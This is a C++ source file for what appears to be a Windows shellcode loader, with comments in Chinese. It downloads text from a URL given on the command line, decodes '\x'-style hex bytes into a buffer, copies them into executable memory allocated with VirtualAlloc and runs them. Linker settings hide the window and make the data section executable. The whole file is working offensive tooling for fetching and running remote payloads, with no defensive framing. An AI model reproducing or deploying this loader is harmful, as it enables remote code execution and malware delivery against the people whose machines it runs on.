// ConsoleApplication1.cpp : 定义控制台应用程序的入口点。
//
#define _CRT_SECURE_NO_WARNINGS
//#include "stdafx.h"
#include <windows.h>
#include <string>
#include <stdio.h>
#include <wininet.h>
#include <iostream>
using namespace std;
#define MAXSIZE 1024
#pragma comment(lib, "Wininet.lib")
#pragma comment(lib,"User32.lib")
//data段可读写    
#pragma comment(linker, "/section:.data,RWE")     
//不显示窗口    
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")    
#pragma comment(linker, "/INCREMENTAL:NO")

using std::string;

#pragma comment(lib,"ws2_32.lib")


HINSTANCE hInst;
WSADATA wsaData;
void mParseUrl(char *mUrl, string &serverName, string &filepath, string &filename, string &port);
SOCKET connectToServer(char *szServerName, int portNum);
int getHeaderLength(char *content);
char *readUrl2(char *szUrl, long &bytesReturnedOut, char **headerOut);


int main(int argc, char** argv)
{
	if (argc != 2) {
		printf("use:loader.exe http://xxxx.com/xxx");
		return 1;
	}
	const int bufLen = 1024;
	char *szUrl = argv[1];
	long fileSize;
	char *memBuffer, *headerBuffer;
	FILE *fp;

	memBuffer = headerBuffer = NULL;

	if (WSAStartup(0x101, &wsaData) != 0)
		return -1;


	memBuffer = readUrl2(szUrl, fileSize, &headerBuffer);
	//printf("returned from readUrl\n");
	//printf("data returned:\n%s", memBuffer);
	if (fileSize != 0)
	{
		printf("Got some data\n");
		//fp = fopen("downloaded.file", "wb");
		//fwrite(memBuffer, 1, fileSize, fp);
		//fclose(fp);
		delete(headerBuffer);
	}

	//+
	int code_length = strlen(memBuffer);
	//printf("%s", memBuffer);
	//char shellcode_str[] = "\\xfc\\xe8\\x89";
	unsigned char shellcode_buf[1000] = { 0 };

	int idx = 0;
	char* tmp_str = strtok(memBuffer, "\\x");
	while (tmp_str)
	{
		printf("%s", tmp_str);
		sscanf(tmp_str, "%x", &shellcode_buf[idx++]);
		tmp_str = strtok(NULL, "\\x");
	}
	void *exec = VirtualAlloc(0, idx, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcode_buf, idx);
	((void(*)())exec)();
	WSACleanup();
	return 0;
}


void mParseUrl(char *mUrl, string &serverName, string &filepath, string &filename, string &port)
{
	string::size_type n, p;
	string url = mUrl;

	if (url.substr(0, 7) == "http://")
		url.erase(0, 7);

	if (url.substr(0, 8) == "https://")
		url.erase(0, 8);

	printf("%s\r\n", url);
	p = url.find(':');
	n = url.find('/');
	if (p != string::npos)
	{
		//printf("you duankou");
		serverName = url.substr(0, p);
		port = url.substr(p + 1, n - p - 1);
		//cout << "port:" << port << endl;
		filepath = url.substr(n);
		n = filepath.rfind('/');
		filename = filepath.substr(n + 1);
	}
	else {
		//printf("default_port:80");
		port = 80;
		n = url.find('/');
		if (n != string::npos)
		{
			serverName = url.substr(0, n);
			filepath = url.substr(n);
			n = filepath.rfind('/');
			filename = filepath.substr(n + 1);
		}

		else
		{
			serverName = url;
			filepath = "/";
			filename = "";
		}
	}

}

SOCKET connectToServer(char *szServerName, int portNum)
{
	struct hostent *hp;
	unsigned int addr;
	struct sockaddr_in server;
	SOCKET conn;

	if (portNum==0)
	{
		portNum = 80;

	}
	conn = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (conn == INVALID_SOCKET)
		return NULL;

	if (inet_addr(szServerName) == INADDR_NONE)
	{
		hp = gethostbyname(szServerName);
		server.sin_addr.s_addr = *((unsigned long*)hp->h_addr);
	}
	else
	{
		addr = inet_addr(szServerName);
		//hp = gethostbyaddr((char*)&addr, sizeof(addr), AF_INET);
		server.sin_addr.s_addr = addr;
	}

	if (hp == NULL)
	{
		closesocket(conn);
		return NULL;
	}

	//server.sin_addr.s_addr = *((unsigned long*)hp->h_addr);
	server.sin_family = AF_INET;
	server.sin_port = htons(portNum);
	if (connect(conn, (struct sockaddr*)&server, sizeof(server)))
	{
		closesocket(conn);
		return NULL;
	}
	return conn;
}

int getHeaderLength(char *content)
{
	const char *srchStr1 = "\r\n\r\n", *srchStr2 = "\n\r\n\r";
	char *findPos;
	int ofset = -1;

	findPos = strstr(content, srchStr1);
	if (findPos != NULL)
	{
		ofset = findPos - content;
		ofset += strlen(srchStr1);
	}

	else
	{
		findPos = strstr(content, srchStr2);
		if (findPos != NULL)
		{
			ofset = findPos - content;
			ofset += strlen(srchStr2);
		}
	}
	return ofset;
}

char *readUrl2(char *szUrl, long &bytesReturnedOut, char **headerOut)
{
	const int bufSize = 512;
	char readBuffer[bufSize], sendBuffer[bufSize], tmpBuffer[bufSize];
	char *tmpResult = NULL, *result;
	SOCKET conn;
	string server, filepath, filename, port;
	long totalBytesRead, thisReadSize, headerLen;

	mParseUrl(szUrl, server, filepath, filename, port);

	///////////// step 1, connect //////////////////////
	conn = connectToServer((char*)server.c_str(), atoi(port.c_str()));

	///////////// step 2, send GET request /////////////
	sprintf(tmpBuffer, "GET %s HTTP/1.0", filepath.c_str());
	strcpy(sendBuffer, tmpBuffer);
	strcat(sendBuffer, "\r\n");
	sprintf(tmpBuffer, "Host: %s", server.c_str());
	strcat(sendBuffer, tmpBuffer);
	strcat(sendBuffer, "\r\n");
	strcat(sendBuffer, "\r\n");
	send(conn, sendBuffer, strlen(sendBuffer), 0);

	//    SetWindowText(edit3Hwnd, sendBuffer);
	printf("Buffer being sent:\n%s", sendBuffer);

	///////////// step 3 - get received bytes ////////////////
	// Receive until the peer closes the connection
	totalBytesRead = 0;
	while (1)
	{
		memset(readBuffer, 0, bufSize);
		thisReadSize = recv(conn, readBuffer, bufSize, 0);

		if (thisReadSize <= 0)
			break;

		tmpResult = (char*)realloc(tmpResult, thisReadSize + totalBytesRead);

		memcpy(tmpResult + totalBytesRead, readBuffer, thisReadSize);
		totalBytesRead += thisReadSize;
	}

	headerLen = getHeaderLength(tmpResult);
	long contenLen = totalBytesRead - headerLen;
	result = new char[contenLen + 1];
	memcpy(result, tmpResult + headerLen, contenLen);
	result[contenLen] = 0x0;
	char *myTmp;

	myTmp = new char[headerLen + 1];
	strncpy(myTmp, tmpResult, headerLen);
	myTmp[headerLen] = NULL;
	delete(tmpResult);
	*headerOut = myTmp;

	bytesReturnedOut = contenLen;
	closesocket(conn);
	return(result);
}
